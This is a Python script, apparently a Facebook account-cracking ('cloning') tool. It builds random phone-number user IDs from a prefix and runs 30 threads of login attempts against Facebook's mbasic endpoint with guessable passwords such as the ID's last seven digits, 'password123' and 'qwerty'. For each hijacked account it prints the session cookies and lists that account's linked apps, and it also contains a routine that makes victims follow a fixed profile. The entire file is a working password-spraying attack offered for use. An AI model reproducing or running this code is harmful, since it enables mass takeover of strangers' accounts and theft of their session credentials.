import os, sys, time, json, random, re, string, platform, uuid
from datetime import date, datetime
from time import sleep
from bs4 import BeautifulSoup
import requests
from concurrent.futures import ThreadPoolExecutor

# Ensure required modules are installed
try:
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4 > /dev/null')

# Function to check Facebook Active & Expired Apps
def cek_apk(session, coki):
    try:
        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
        soup = BeautifulSoup(response, "html.parser")
        apps = [i.text for i in soup.find_all("h3")]

        if apps:
            print("[✓] Active Apps:")
            for i, app in enumerate(apps, 1):
                print(f"[{i}] {app}")
        else:
            print("[!] No Active Apps Found.")

        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
        soup = BeautifulSoup(response, "html.parser")
        expired_apps = [i.text for i in soup.find_all("h3")]

        if expired_apps:
            print("[✓] Expired Apps:")
            for i, app in enumerate(expired_apps, 1):
                print(f"[{i}] {app}")
        else:
            print("[!] No Expired Apps Found.")
    except Exception as e:
        print(f"Error checking apps: {e}")

# Function to Follow a Facebook Profile
def follow(session, coki):
    try:
        response = session.get('https://mbasic.facebook.com/profile.php?id=100064267823693', cookies={"cookie": coki}).text
        soup = BeautifulSoup(response, 'html.parser')
        follow_link = soup.find('a', string="Ikuti")
        if follow_link:
            session.get('https://mbasic.facebook.com' + follow_link.get('href'), cookies={"cookie": coki})
            print("[✓] Followed successfully!")
        else:
            print("[!] Follow button not found.")
    except Exception as e:
        print(f"Error following profile: {e}")

# Define colors for CLI
P, M, H, K, B, U, O, N = '\x1b[1;97m', '\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[0m'
warna = random.choice([P, M, H, K, B, U, O, N])

# Display New ASCII Banner
def banner():
    os.system("clear")
    print(f"""{warna}
 /$$      /$$ /$$$$$$$        /$$$$$$$  /$$$$$$$  /$$$$$$ /$$   /$$  /$$$$$$  /$$$$$$$$ 
| $$$    /$$$| $$__  $$      | $$__  $$| $$__  $$|_  $$_/| $$$ | $$ /$$__  $$| $$_____/ 
| $$$$  /$$$$| $$  \ $$      | $$  \ $$| $$  \ $$  | $$  | $$$$| $$| $$  \__/| $$       
| $$ $$/$$ $$| $$$$$$$/      | $$$$$$$/| $$$$$$$/  | $$  | $$ $$ $$| $$      | $$$$$    
| $$  $$$| $$| $$__  $$      | $$____/ | $$__  $$  | $$  | $$  $$$| $$      | $$__/    
| $$\  $ | $$| $$  \ $$      | $$      | $$  \ $$  | $$  | $$\  $$$| $$    $$| $$       
| $$ \/  | $$| $$  | $$      | $$      | $$  | $$ /$$$$$$| $$ \  $$|  $$$$$$/| $$$$$$$$ 
|__/     |__/|__/  |__/      |__/      |__/  |__/|______/|__/  \__/ \______/ |________/ 
---------------------------------------------------------------------------------------
 AUTHOR    : MR-PRINCE  
 FACEBOOK  : THE THE UNSTOPPABLE LEGEND MR PRINCE HERE
 TYPE      : FREE 
 VERSION   : 1.83.0
---------------------------------------------------------------------------------------
    """)

# Multi-threaded function
def crack(uid, password_list):
    global oks, cps
    try:
        session = requests.Session()
        for password in password_list:
            response = session.post("https://mbasic.facebook.com/login/device-based/regular/login/", data={
                "email": uid,
                "pass": password,
                "login": "Log In"
            })

            if "c_user" in session.cookies.get_dict():
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                print(f"\033[1;32m[✓] {uid} | {password} | {coki}\033[0m")
                cek_apk(session, coki)
                oks.append(uid)
                break
            elif "checkpoint" in session.cookies.get_dict():
                print(f"\033[1;31m[CP] {uid} | {password}\033[0m")
                cps.append(uid)
                break
    except Exception as e:
        print(f"Error: {e}")

# Function to generate random user IDs and passwords
def start_cloning():
    banner()
    user = []
    print(f"{M}[•] Example: 019, 017, 016")
    code = input(f"{H}[•] Enter code: ")
    limit = int(input(f"{H}[•] Enter limit (e.g. 10000): "))

    for _ in range(limit):
        user.append(code + ''.join(random.choice(string.digits) for _ in range(7)))

    print(f"{H}[•] Starting Crack on {len(user)} IDs...")
    with ThreadPoolExecutor(max_workers=30) as executor:
        for uid in user:
            passwords = [uid[-7:], "password123", "qwerty"]
            executor.submit(crack, uid, passwords)

    print(f"{H}[✓] Process Completed.")
    print(f"{H}[✓] OK: {len(oks)} | CP: {len(cps)}")

if __name__ == "__main__":
    oks, cps = [], []
    start_cloning()